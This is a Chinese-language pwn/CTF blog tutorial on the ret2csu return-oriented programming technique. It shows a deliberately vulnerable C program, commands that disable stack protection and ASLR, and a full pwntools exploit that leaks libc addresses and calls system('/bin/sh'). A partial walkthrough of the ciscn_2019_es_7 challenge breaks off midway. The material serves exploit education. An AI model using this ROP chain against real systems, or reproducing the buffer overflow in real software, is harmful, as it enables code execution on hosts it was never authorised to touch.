<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="ret2csuåŸç†åˆ©ç”¨x64ä¸‹__libc_csu_initå‡½æ•°ä¸­çš„gadgets.ï¼ˆ64ä½ä¼ å‚æœºåˆ¶å¯¼è‡´ï¼Œä½†æˆ‘ä»¬ä¸ä¼šæ¯æ¬¡éƒ½ç²¾å‡†æ‰¾åˆ°æ¯ä¸ªå¯„å­˜å™¨å¯¹åº”çš„gadgetsï¼‰ æ­¤å‡½æ•°å¯¹libcè¿›è¡Œåˆå§‹åŒ–ï¼Œè€Œä¸€èˆ¬çš„ç¨‹åºéƒ½ä¼šè°ƒç”¨libcå‡½æ•°ï¼Œåˆ™æ­¤å‡½æ•°ä¸€å®šå­˜åœ¨. ä»€ä¹ˆæ˜¯gadgetsï¼Ÿgadgetsæ˜¯ä¸€æ®µå¯¹å¯„å­˜å™¨è¿›è¡Œæ“ä½œçš„æ±‡ç¼–æŒ‡ä»¤ï¼Œæ¯”å¦‚pop ebpï¼›pop eaxï¼›æ¯ä¸€æ¡æŒ‡ä»¤å¯¹åº”ç€ä¸€æ®µåœ°å€å°†è¿™äº›gadgetséƒ¨ç½²">
<meta property="og:type" content="article">
<meta property="og:title" content="ret2csu">
<meta property="og:url" content="https://yubut.github.io/2023/09/01/ret2csu/index.html">
<meta property="og:site_name" content="å¹»å¢ƒ">
<meta property="og:description" content="ret2csuåŸç†åˆ©ç”¨x64ä¸‹__libc_csu_initå‡½æ•°ä¸­çš„gadgets.ï¼ˆ64ä½ä¼ å‚æœºåˆ¶å¯¼è‡´ï¼Œä½†æˆ‘ä»¬ä¸ä¼šæ¯æ¬¡éƒ½ç²¾å‡†æ‰¾åˆ°æ¯ä¸ªå¯„å­˜å™¨å¯¹åº”çš„gadgetsï¼‰ æ­¤å‡½æ•°å¯¹libcè¿›è¡Œåˆå§‹åŒ–ï¼Œè€Œä¸€èˆ¬çš„ç¨‹åºéƒ½ä¼šè°ƒç”¨libcå‡½æ•°ï¼Œåˆ™æ­¤å‡½æ•°ä¸€å®šå­˜åœ¨. ä»€ä¹ˆæ˜¯gadgetsï¼Ÿgadgetsæ˜¯ä¸€æ®µå¯¹å¯„å­˜å™¨è¿›è¡Œæ“ä½œçš„æ±‡ç¼–æŒ‡ä»¤ï¼Œæ¯”å¦‚pop ebpï¼›pop eaxï¼›æ¯ä¸€æ¡æŒ‡ä»¤å¯¹åº”ç€ä¸€æ®µåœ°å€å°†è¿™äº›gadgetséƒ¨ç½²">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230728162434881.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729002006111.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729152236817.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729004219289.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729011314600.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729011813031.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729012308773.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729160314382.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729164657543.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729164622920.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729164913572.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729165814524.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729171034681.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729171514964.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729172115885.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729172330284.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729224838828.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729231040910.png">
<meta property="og:image" content="https://img2022.cnblogs.com/blog/2706180/202202/2706180-20220218171939424-200600591.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731005633820.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731004821556.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731005122883.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731005742112.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731155611578.png">
<meta property="article:published_time" content="2023-08-31T16:00:00.000Z">
<meta property="article:modified_time" content="2023-09-01T12:18:30.005Z">
<meta property="article:author" content="yub">
<meta property="article:tag" content="pwn,çŸ¥è¯†ç¢ç‰‡">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230728162434881.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>ret2csu</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="å¹»å¢ƒ" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="ç›®å½•"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="ç›®å½•"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="é¡¶éƒ¨" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Articles</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/links/">Links</a></li><!--
     --><!--
       --><li><a href="/tags/">Tags</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="ä¸Šä¸€ç¯‡" href="/2023/09/01/Pwn%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="ä¸‹ä¸€ç¯‡" href="/2023/09/01/%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%5B%E5%9F%BA%E7%A1%80%E7%AF%87%5D/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="è¿”å›é¡¶éƒ¨" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="åˆ†äº«æ–‡ç« " href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">ä¸Šä¸€ç¯‡</span>
      <span id="i-next" class="info" style="display:none;">ä¸‹ä¸€ç¯‡</span>
      <span id="i-top" class="info" style="display:none;">è¿”å›é¡¶éƒ¨</span>
      <span id="i-share" class="info" style="display:none;">åˆ†äº«æ–‡ç« </span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://yubut.github.io/2023/09/01/ret2csu/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://yubut.github.io/2023/09/01/ret2csu/&text=ret2csu"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://yubut.github.io/2023/09/01/ret2csu/&title=ret2csu"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://yubut.github.io/2023/09/01/ret2csu/&is_video=false&description=ret2csu"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ret2csu&body=Check out this article: https://yubut.github.io/2023/09/01/ret2csu/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://yubut.github.io/2023/09/01/ret2csu/&title=ret2csu"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://yubut.github.io/2023/09/01/ret2csu/&title=ret2csu"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://yubut.github.io/2023/09/01/ret2csu/&title=ret2csu"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://yubut.github.io/2023/09/01/ret2csu/&title=ret2csu"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://yubut.github.io/2023/09/01/ret2csu/&name=ret2csu&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://yubut.github.io/2023/09/01/ret2csu/&t=ret2csu"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2csu"><span class="toc-number">1.</span> <span class="toc-text">ret2csu</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.0.1.</span> <span class="toc-text">åŸç†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%EF%BC%88%E8%92%B8%E7%B1%B3ROP%EF%BC%89"><span class="toc-number">1.0.2.</span> <span class="toc-text">å®ä¾‹ï¼ˆè’¸ç±³ROPï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.0.2.1.</span> <span class="toc-text">æ€è·¯</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E9%A2%98%E7%9B%AE"><span class="toc-number">1.0.3.</span> <span class="toc-text">å…¶ä»–é¢˜ç›®</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ciscn-2019-es-7%EF%BC%88%E5%85%B6%E5%AE%9ESROP%EF%BC%89"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">ciscn_2019_es_7ï¼ˆå…¶å®SROPï¼‰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gyctf-2020-borrowstack"><span class="toc-number">1.0.3.2.</span> <span class="toc-text">gyctf_2020_borrowstack</span></a></li></ol></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        ret2csu
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">yub</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-08-31T16:00:00.000Z" class="dt-published" itemprop="datePublished">2023-09-01</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">äºŒè¿›åˆ¶å®‰å…¨</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/pwn-%E7%9F%A5%E8%AF%86%E7%A2%8E%E7%89%87/" rel="tag">pwn,çŸ¥è¯†ç¢ç‰‡</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>åˆ©ç”¨x64ä¸‹__libc_csu_initå‡½æ•°ä¸­çš„gadgets.ï¼ˆ64ä½ä¼ å‚æœºåˆ¶å¯¼è‡´ï¼Œä½†æˆ‘ä»¬ä¸ä¼šæ¯æ¬¡éƒ½ç²¾å‡†æ‰¾åˆ°æ¯ä¸ªå¯„å­˜å™¨å¯¹åº”çš„gadgetsï¼‰</p>
<p>æ­¤å‡½æ•°å¯¹libcè¿›è¡Œåˆå§‹åŒ–ï¼Œè€Œä¸€èˆ¬çš„ç¨‹åºéƒ½ä¼šè°ƒç”¨libcå‡½æ•°ï¼Œåˆ™æ­¤å‡½æ•°ä¸€å®šå­˜åœ¨.</p>
<p><strong>ä»€ä¹ˆæ˜¯gadgetsï¼Ÿ</strong><br>gadgetsæ˜¯ä¸€æ®µå¯¹å¯„å­˜å™¨è¿›è¡Œæ“ä½œçš„æ±‡ç¼–æŒ‡ä»¤ï¼Œæ¯”å¦‚pop ebpï¼›pop eaxï¼›æ¯ä¸€æ¡æŒ‡ä»¤å¯¹åº”ç€ä¸€æ®µåœ°å€å°†è¿™äº›gadgetséƒ¨ç½²åˆ°æ ˆä¸­ï¼Œ__ spæŒ‡é’ˆæŒ‡å‘æŸgadgetæ—¶å‘ç°å¯¹åº”åœ°å€ä¸­æ˜¯ä¸€æ¡æŒ‡ä»¤è€Œä¸æ˜¯ä¸€æ¡æ•°æ®åå°±ä¼šå°†è¯¥åœ°å€å¼¹ç»™ __ ipæŒ‡é’ˆï¼Œ __ipæŒ‡é’ˆä¼šæ‰§è¡Œè¯¥åœ°å€ä¸­å­˜æ”¾çš„æ±‡ç¼–æŒ‡ä»¤ï¼Œå®Œæˆå¯¹å¯„å­˜å™¨çš„æ“ä½œ.ï¼ˆæŸä¸€gadget-0x1aå¾—åˆ°ä¸Šä¸€gadgetï¼‰ </p>
<h3 id="å®ä¾‹ï¼ˆè’¸ç±³ROPï¼‰"><a href="#å®ä¾‹ï¼ˆè’¸ç±³ROPï¼‰" class="headerlink" title="å®ä¾‹ï¼ˆè’¸ç±³ROPï¼‰"></a>å®ä¾‹ï¼ˆè’¸ç±³ROPï¼‰</h3><p>æºç </p>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
void vulnerable_function() &#123;
    char buf[128];
    read(STDIN_FILENO, buf, 512);
&#125;

int main(int argc, char** argv) &#123;
    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);
    vulnerable_function();
&#125;
</code></pre>
<p>å…³é—­æ ˆä¿æŠ¤å¹¶è¿›è¡Œç¼–è¯‘</p>
<pre><code>gcc -g -fno-stack-protector â€”z execstack -o test.c test
</code></pre>
<p>å…³é—­æœ¬æœºéšæœºåŒ–ï¼ˆä½é…ï¼‰</p>
<pre><code>#echo 0 &gt; /proc/sys/kernel/randomize_va_space
</code></pre>
<p>checksecçœ‹çœ‹<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230728162434881.png" alt="image-20230728162434881"></p>
<p>å¯ä»¥çœ‹åˆ°PIEè¿˜æ‰“å¼€ï¼ˆä½†æˆ‘ä»¬å…³é—­äº†æœ¬æœºä¸Šçš„åœ°å€éšæœºåŒ–å¯ä»¥å½“ä½œPIEdisableï¼‰<br>ç›¸å½“äºç”¨</p>
<pre><code>gcc -fno-stack-protector -no-pie -o level test.c
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729002006111.png" alt="image-20230729002006111"></p>
<p>Go to IDA</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729152236817.png" alt="image-20230729152236817"></p>
<p>ä¸‹é¢ä¸ºgadget1ï¼Œä¸Šé¢ä¸ºgadget2.ï¼ˆä¸åŒç‰ˆæœ¬gagget2ä¸åŒï¼Œéœ€è¦ä¿®æ”¹ï¼‰</p>
<p>èµ·å§‹åœ°å€å¯ä»¥ç”¨0x4006AAï¼Œå› ä¸ºæˆ‘ä»¬å¹¶ä¸éœ€è¦addï¼Œä»popéœ€è¦å¯„å­˜å™¨å¼€å§‹å°±ğŸ†—.ä½†æ˜¯éœ€è¦å ä½ï¼ˆè§£é¢˜æ€è·¯ä¸­è¯¦ç»†è§£é‡Šï¼Œè¯·çœ‹ä»¥ä¸‹åˆ†æï¼‰</p>
<p><strong>é”™ä½è·å–pop rsiï¼›pop rdi</strong><br>è‹¥åªæ˜¯æƒ³å•çº¯æ§åˆ¶pop rsiå’Œpop rdiå¯„å­˜å™¨ï¼Œå¯ä»¥åˆ©ç”¨ROPgadgetï¼ˆpop r14å’Œpop r15å¯¹åº”å¾—gadgetå­˜åœ¨äºlibc_csu_initä¸­ï¼‰<br>æœºå™¨ç ä¸º<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729004219289.png" alt="image-20230729004219289"></p>
<p>å…·ä½“searchè¯­æ³•</p>
<pre><code>ROPgadget --binary level --opcode 5e
#æˆ–è€…
ROPgadget --binary level | grep &#39;pop rsi&#39;
</code></pre>
<h4 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h4><p>æœ€ç»ˆç›®çš„æ˜¯æ‰§è¡Œsystemï¼ˆâ€˜&#x2F;bin&#x2F;shâ€™ï¼‰ï¼ŒNXä¿æŠ¤å¼€å¯ï¼Œæˆ‘ä»¬éœ€è¦æ³„éœ²libcå‡½æ•°åœ°å€(é€šè¿‡read&#x2F;writeå‡½æ•°)ï¼Œæ‰¾åˆ°systemå‡½æ•°å†™å…¥â€˜&#x2F;bin&#x2F;shâ€™åˆ°bssæ®µä¸Šï¼Œæœ€åè°ƒç”¨systemå‡½æ•°.</p>
<p><strong>æ³¨æ„</strong><br>æˆ‘ä»¬é€šå¸¸ä¼šæŠŠrbxçš„å€¼è®¾ç½®æˆ0ï¼Œè€Œrbpè®¾ç½®æˆ1.è¿™æ ·çš„ç›®çš„æ˜¯åœ¨æ‰§è¡Œcall qword ptr [r12+rbx*8]è¿™ä¸ªæŒ‡ä»¤çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä»…ä»…æŠŠr12çš„å€¼ç»™è®¾ç½®æˆæŒ‡å‘æˆ‘ä»¬æƒ³callåœ°å€çš„åœ°å€å³å¯ï¼Œä»è€Œä¸ç”¨ç®¡rbxã€‚<br>åˆå› ä¸ºè¿™ä¸‰ä¸ªæŒ‡ä»¤add rbx,ï¼›cmp rbx, rbpï¼›jnz short loc_400580ï¼Œjnzæ˜¯ä¸ç›¸ç­‰æ—¶è·³è½¬ï¼Œæˆ‘ä»¬é€šå¸¸å¹¶ä¸æƒ³è·³è½¬åˆ°0x400580è¿™ä¸ªåœ°æ–¹ï¼Œå› ä¸ºæ­¤åˆ»æ‰§è¡Œè¿™ä¸‰ä¸ªæŒ‡ä»¤çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±æ˜¯ä»0x400580è¿™ä¸ªåœ°å€è¿‡æ¥çš„ã€‚å› æ­¤rbxåŠ ä¸€ä¹‹åï¼Œæˆ‘ä»¬è¦è®©å®ƒå’Œrbpç›¸ç­‰ï¼Œå› æ­¤rbpå°±è¦æå‰è¢«è®¾ç½®æˆ1.<br>r12è¦å­˜æ”¾çš„å°±æ˜¯æŒ‡å‘ï¼ˆæˆ‘ä»¬è¦è·³è½¬åˆ°é‚£ä¸ªåœ°å€ï¼‰çš„åœ°å€ã€‚è¿™é‡Œæœ‰ä¸ªå¾ˆé‡è¦çš„å°æŠ€å·§ï¼Œå¦‚æœä½ ä¸æƒ³ä½¿ç”¨è¿™ä¸ªcallï¼Œæˆ–è€…è¯´ä½ æƒ³callä¸€ä¸ªå‡½æ•°ï¼Œä½†æ˜¯ä½ æ‹¿ä¸åˆ°å®ƒçš„gotåœ°å€ï¼Œå› æ­¤æ²¡æ³•ä½¿ç”¨è¿™ä¸ªcallï¼Œé‚£å°±å»callä¸€ä¸ªç©ºå‡½æ•°ï¼ˆ_term_procå‡½æ•°ï¼‰ï¼ˆå¹¶ä¸”è¦æ³¨æ„çš„æ˜¯ï¼Œr12çš„åœ°å€å¡«å†™çš„å¹¶ä¸æ˜¯_term_procçš„åœ°å€ï¼Œè€Œæ˜¯æŒ‡å‘è¿™ä¸ªå‡½æ•°çš„åœ°å€ï¼‰ã€‚<br>r13,r14,r15è¿™ä¸‰ä¸ªå€¼åˆ†åˆ«å¯¹åº”äº†rdx,rsi,ediã€‚è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œr15æœ€åä¼ ç»™çš„æ˜¯edi,æœ€årdiçš„é«˜å››å­—èŠ‚éƒ½æ˜¯00ï¼Œè€Œä½å››å­—èŠ‚æ‰æ˜¯r15é‡Œçš„å†…å®¹ã€‚ï¼ˆä¹Ÿå°±æ˜¯è¯´å¦‚æœæƒ³ç”¨ret2csuå»æŠŠrdié‡Œå­˜æ”¾æˆä¸€ä¸ªåœ°å€æ˜¯ä¸å¯è¡Œçš„ï¼‰</p>
<p><strong>å¡«å……å›¾</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729011314600.png" alt="image-20230729011314600"></p>
<p>æ³¨æ„gadgetæœ«å°¾æœ‰ä¸ªret p64ï¼ˆ8ï¼‰å ä½</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729011813031.png" alt="image-20230729011813031"></p>
<p>ä¸ºä»€ä¹ˆè¦å°†systemå‡½æ•°åœ°å€å†™å…¥bssæ®µ? å› ä¸ºè¿™è¡Œä»£ç call qword ptr [r12+rbx*8]æ˜¯<u>é—´æ¥è·³è½¬</u>ï¼Œä¹Ÿå°±æ˜¯å…ˆå°†r12åœ°å€çš„å€¼å–å‡ºæ¥ï¼Œå†è¿›è¡Œè·³è½¬(æƒ³æƒ³Lazy Binding)ã€‚æœ€åçš„æ•ˆæœå°±æ˜¯ï¼Œä»bss_addrä¸­å–å‡ºsystemå‡½æ•°çš„åœ°å€ï¼Œå†è·³è½¬åˆ°systemå‡½æ•°å¤„ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729012308773.png" alt="image-20230729012308773"></p>
<p>exp</p>
<pre><code class="python">from pwn import *
from LibcSeacher import *
#context.log_level = &#39;debug&#39;
p = process(&#39;./level&#39;)
elf = ELF(&#39;./level&#39;)
libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)

write_got = elf.got[&#39;write&#39;]
read_got = elf.got[&#39;read&#39;]
main_addr = 0x400564
bss_addr = 0x601028
gadget1 = 0x400606
gadget2 = 0x4005F0

payload1 = cyclic(0x88) + p64(gadget1) + p64(0) + p64(0) + p64(1) + p64(write_got) + p64(1) + p64(write_got)
payload1 += p64(8) + p64(gadget2) + cyclic(0x38) + p64(main_addr)

p.sendlineafter(&#39;/n&#39;, payload1)
sleep(1)

write_addr = u64(p.recv(8))
sys_addr = write_addr - (libc.symbols[&#39;write&#39;] - libc.symbols[&#39;system&#39;])

payload2 = cyclic(0x88) + p64(gadget1) + p64(0) + p64(0) + p64(1) + p64(read_got) + p64(0) + p64(bss_addr)
payload2 += p64(16) + p64(gadget2) + cyclic(0x38) + p64(main_addr)

p.sendlineafter(&#39;/n&#39;, payload2)
sleep(1)

p.send(p64(sys_addr))
p.send(&quot;/bin/sh/x00&quot;)


payload3 = cyclic(0x88) + p64(gadget1) + p64(0) + p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr + 8) + p64(0)
payload3 += p64(0) + p64(gadget2) + &#39;/x00&#39; * 0x38 + p64(main_addr)

sleep(1)
p.sendlineafter(&#39;/n&#39;, payload3)

p.interactive()
</code></pre>
<h3 id="å…¶ä»–é¢˜ç›®"><a href="#å…¶ä»–é¢˜ç›®" class="headerlink" title="å…¶ä»–é¢˜ç›®"></a>å…¶ä»–é¢˜ç›®</h3><h4 id="ciscn-2019-es-7ï¼ˆå…¶å®SROPï¼‰"><a href="#ciscn-2019-es-7ï¼ˆå…¶å®SROPï¼‰" class="headerlink" title="ciscn_2019_es_7ï¼ˆå…¶å®SROPï¼‰"></a>ciscn_2019_es_7ï¼ˆå…¶å®SROPï¼‰</h4><p>ï¼ˆ1ï¼‰checksec ï¼ˆåå­—å¤ªé•¿å°±ç»™æ”¹æˆaäº†wï¼‰</p>
<p>â€‹    <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729160314382.png" alt="image-20230729160314382"></p>
<p>ï¼ˆ2ï¼‰Good woman IDA</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729164657543.png" alt="image-20230729164657543"></p>
<p>  åç§»0x18<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729164622920.png" alt="image-20230729164622920"></p>
<p>æŸ¥çœ‹vulnå‡½æ•°å‘ç°ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ï¼šreadå’Œwrite ä»¥åŠsyscallå‡½æ•°</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729164913572.png" alt="image-20230729164913572"></p>
<p>åŒæ—¶raxè¢«æ”¹æˆäº†0x3Bï¼Œå¯¹åº”è°ƒç”¨execveå‡½æ•°.</p>
<p>ä½¿ç”¨ROPgadgetæŸ¥çœ‹å¯åˆ©ç”¨çš„gadget.<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729165814524.png" alt="image-20230729165814524"></p>
<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åªèƒ½å•ç‹¬æ§åˆ¶rdiï¼Œä¸èƒ½æ§åˆ¶rsiï¼Œrdxçš„å€¼.é‚£å°±ret2csuï¼ˆå½“ç„¶ä¸“é¢˜åºŸè¯hhï¼‰æ§åˆ¶rdxå’Œrsiå‚æ•°ï¼Œæœ€åæ‰§è¡Œmov raxï¼Œ0x3bï¼› syscallå³å¯.</p>
<p>so éš¾ç‚¹æ¥äº†ï¼šæ€ä¹ˆæŠŠå‚æ•°åœ°å€å­˜å…¥rdiï¼Ÿ<br>ç”±äºæˆ‘ä»¬æ§åˆ¶ä¸äº†raxçš„å€¼ï¼Œæ— æ³•ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨å°†å…¶è®¾ç½®ä¸º0.bssæ®µå†™ä¸äº†ï¼Œåªèƒ½å†™å…¥ç¨‹åºç»™æˆ‘ä»¬çš„ç‰¹å®šä½ç½®æ¥äº†ï¼Œæ„å‘³ç€æˆ‘ä»¬éœ€è¦æ³„éœ²æ ˆä¸Šçš„åœ°å€.çœ‹çœ‹ç¨‹åºæ˜¯å¦ä¸ºæˆ‘ä»¬æä¾›äº†å¯ä»¥åˆ©ç”¨çš„ä»£ç .</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729171034681.png" alt="image-20230729171034681"></p>
<p>ç¬¬ä¸‰ä¸ªå‚æ•°ä¸º0x30</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729171514964.png" alt="image-20230729171514964"></p>
<p>bufè·ç¦»æ ˆé¡¶åªæœ‰10å­—èŠ‚è·ç¦»ï¼Œå› æ­¤writeå‡½æ•°å¯ä»¥æ‰“å°å‡ºæ ˆä¸­å†…å®¹.</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729172115885.png" alt="image-20230729172115885"></p>
<p>æµ‹è¯•åªèƒ½æ˜¾ç¤º48å­—èŠ‚ gdbè°ƒå¼0x30åˆšåˆšå¥½ï¼ˆå…·ä½“ä¹‹åè¡¥å……ï¼‰</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729172330284.png" alt="image-20230729172330284"></p>
